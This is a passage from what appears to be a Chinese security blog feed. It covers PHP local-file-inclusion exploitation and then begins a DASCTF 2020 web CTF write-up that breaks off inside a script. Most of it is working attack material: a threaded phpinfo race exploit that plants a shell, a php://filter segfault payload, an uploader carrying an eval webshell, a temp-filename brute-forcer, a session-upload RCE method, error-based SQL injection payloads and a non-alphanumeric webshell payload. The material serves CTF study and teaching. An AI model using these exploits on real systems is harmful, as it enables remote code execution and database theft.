HTTP/1.1r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;</span><span class="string">&quot;&quot;</span> + padding + <span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Length: %sr</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s&quot;</span><span class="string">&quot;&quot;</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line"><span class="comment">#     LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s%%00 HTTP/1.1r</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="comment"># Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="comment"># Host: %sr</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;</span><span class="string">&quot;GET /lfi.php?file=%s HTTP/1.1r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt&quot;</span>)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">        <span class="comment"># print fn</span></span><br><span class="line">    except ValueError:</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (<span class="function"><span class="keyword">fn</span>, <span class="title">host</span>))</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = <span class="title">s2</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s2</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">d</span>.<span class="title">find</span>(<span class="params">tag</span>) != -1:</span></span><br><span class="line"><span class="function">        <span class="title">return</span> <span class="title">fn</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">counter</span>=0</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">__init__</span>(<span class="params"><span class="built_in">self</span>, e, l, m, *args</span>):</span></span><br><span class="line"><span class="function">        <span class="title">threading</span>.<span class="title">Thread</span>.<span class="title">__init__</span>(<span class="params"><span class="built_in">self</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">event</span> = <span class="title">e</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">lock</span> = <span class="title">l</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">maxattempts</span> = <span class="title">m</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">args</span> = <span class="title">args</span></span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">run</span>(<span class="params"><span class="built_in">self</span></span>):</span></span><br><span class="line"><span class="function">        <span class="title">global</span> <span class="title">counter</span></span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="title">not</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">            <span class="title">with</span> <span class="title">self</span>.<span class="title">lock</span>:</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">counter</span> &gt;= <span class="title">self</span>.<span class="title">maxattempts</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">return</span></span></span><br><span class="line"><span class="function">                <span class="title">counter</span>+=1</span></span><br><span class="line"><span class="function">            <span class="title">try</span>:</span></span><br><span class="line"><span class="function">                <span class="title">x</span> = <span class="title">phpInfoLFI</span>(<span class="params">*<span class="built_in">self</span>.args</span>)</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">                    <span class="title">break</span></span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">x</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">print</span> &quot;<span class="title">nGot</span> <span class="title">it</span>! <span class="title">Shell</span> <span class="title">created</span> <span class="title">in</span> /<span class="title">tmp</span>/<span class="title">g</span>&quot;</span></span><br><span class="line"><span class="function">                    <span class="title">self</span>.<span class="title">event</span>.<span class="title">set</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            <span class="title">except</span> <span class="title">socket</span>.<span class="title">error</span>:</span></span><br><span class="line"><span class="function">                <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line"><span class="function">    &quot;&quot;&quot;<span class="title">Gets</span> <span class="title">offset</span> <span class="title">of</span> <span class="title">tmp_name</span> <span class="title">in</span> <span class="title">the</span> <span class="title">php</span> <span class="title">output</span>&quot;&quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">s</span> = <span class="title">socket</span>.<span class="title">socket</span>(<span class="params">socket.AF_INET, socket.SOCK_STREAM</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">connect</span>(<span class="params">(<span class="params">host,port</span>)</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">send</span>(<span class="params">phpinforeq</span>)</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="function">        <span class="title">i</span> = <span class="title">s</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">d</span>+=<span class="title">i</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span> == &quot;&quot;:</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">        # <span class="title">detect</span> <span class="title">the</span> <span class="title">final</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span>.<span class="title">endswith</span>(<span class="params"><span class="string">&quot;0rnrn&quot;</span></span>):</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">i</span> = <span class="title">d</span>.<span class="title">find</span>(<span class="params"><span class="string">&quot;[tmp_name] =&amp;gt&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">i</span> == -1:</span></span><br><span class="line"><span class="function">        <span class="title">raise</span> <span class="title">ValueError</span>(<span class="params"><span class="string">&quot;No php tmp_name in phpinfo output&quot;</span></span>)</span></span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    except socket.<span class="built_in">error</span>, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="keyword">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="keyword">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> not e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Woot! m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.set()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="with-php崩溃">with php崩溃</h2><h3 id="php-segfault">php segfault</h3><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p><p><strong>1. php &lt; 7.2</strong></p><p><code>php://filter/string.strip_tags/resource=/etc/passwd</code></p><p><strong>2. php7 老版本通杀</strong></p><p><code>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></p><p>利用脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># php崩溃 生成大量临时文件</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">def upload_file(url, file_content):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, files=files)</span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">charset = <span class="keyword">string</span>.digits+<span class="keyword">string</span>.letters</span><br><span class="line">webshell = <span class="string">&#x27;&lt;?php eval($_REQUEST[daolgts]);?&gt;&#x27;</span>.encode(<span class="string">&quot;base64&quot;</span>).strip()</span><br><span class="line">file_content = <span class="string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/daolgts&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;success&quot;;&#125;?&gt;&#x27;</span> % (webshell)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line">payload1=<span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload2=r<span class="string">&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">lfi_url = url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=&quot;</span>+payload1</span><br><span class="line">length = <span class="number">6</span></span><br><span class="line">times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i in xrange(times):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">    upload_file(lfi_url, file_content)</span><br></pre></td></tr></table></figure><h3 id="爆破tmp文件名">爆破tmp文件名</h3><p>然后爆破临时文件名来包含</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                        filename = i + j + k + l + m + n</span><br><span class="line">                        url = base_url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=/tmp/php&quot;</span>+filename</span><br><span class="line">                        <span class="keyword">print</span> url</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            response = requests.get(url)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;url:&quot;</span>+url</span><br><span class="line">                                exit()</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><h2 id="session">session</h2><p><strong>利用条件</strong></p><p>session文件路径已知，且其中内容部分可控。</p><p><strong>利用方式</strong></p><blockquote><p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是 <code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值。</p></blockquote><p>也就是说session中会添加<code>session.upload_progress.prefix</code>+<code>$_POST[ini_get['session.upload_progress.name']]</code>,而<code>session.upload_progress.name</code>是可控的，所以就可以在session写入php代码，然后包含session文件来rce</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP-LFI利用总结&quot;&gt;PHP LFI利用总结&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;参考文章：&lt;a href=&quot;https://www.anquanke.com/post/id/177491&quot;&gt;https://www.anquanke.com/post/i
      
    
    </summary>
    
    
      <category term="web安全" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="web安全基础" scheme="http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF八月赛WP</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B/</id>
    <published>2020-09-05T11:53:18.000Z</published>
    <updated>2020-09-07T01:02:34.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF八月赛-Web-Writeup">DASCTF八月赛 Web Writeup</h1><h2 id="安恒大学">安恒大学</h2><h3 id="考点">考点</h3><ul><li>渗透测试</li><li>SQL报错注入</li></ul><h3 id="解题">解题</h3><p>y1ng师傅出的一道题，非常顶，可以说是这是一道实战改编题，y1ng师傅在做渗透测试时，在一个系统的某个不起眼的地方——邮件激活链接发现了SQL注入，并得到了全校所有学生的内网平台账号密码，而学生的所有信息、所有网上办事等等几乎都使用校内网平台的账号密码。</p><p>其实比赛的时候主办方也提醒了邮箱不要随便填，不过当时还是没能察觉到邮件激活链接中的一个参数存在SQL注入。</p><p>现在正式解题，直接看邮件激活链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;ca01h&amp;token&#x3D;cf42313ae7812e9234d5b378f095e688</span><br></pre></td></tr></table></figure><p>注入点在username参数，说一下我的解题过程：</p><p>首先使SQL语句报错</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200253.png" alt=""></p><p>再尝试万能注入payload：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200602.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/image-20200905200658101.png" alt=""></p><p>好像可以使用盲注，再尝试<code>ca01h2' or if(length(select database())&gt;1, 1, 0)--+</code>，结果直接SQL语句报错</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200842.png" alt=""></p><p>盲注不行，联合注入被过滤，那么接着试一下报错注入：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200951.png" alt=""></p><p>成功爆出当前用户名，接下来的工作就是拿数据。</p><p>爆表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure><p>一共有三个表：<code>student, teachers, users</code></p><p>爆列名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39; limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure><p>student表一共四个字段：<code>id, username, age, sex</code></p><p>teachers表：<code>id, f1aaaag, </code></p><p>爆数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select reverse(f1aaaag) from teachers limit 11,1),0x7e)))--+</span><br></pre></td></tr></table></figure><h2 id="rceme">rceme</h2><h3 id="考点-v2">考点</h3><ul><li>无字母数字webshell</li></ul><h3 id="解题-v2">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you are not smart&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$code</span>)&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了所有字母数字和部分逻辑运算符以及常用于构造webshell的<code>^</code>、<code>~</code>、<code>&amp;</code>等符号。</p><p>但是还有一个逻辑运算符放出来了 <code>|</code>或运算。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905222802.png" alt=""></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;&#39;));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>应该是可以用python脚本fuzz出来的。</p><p>y1ng师傅的方法，直接不用或运算符，TQLLLLLL，代码看不太懂，膜就完事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 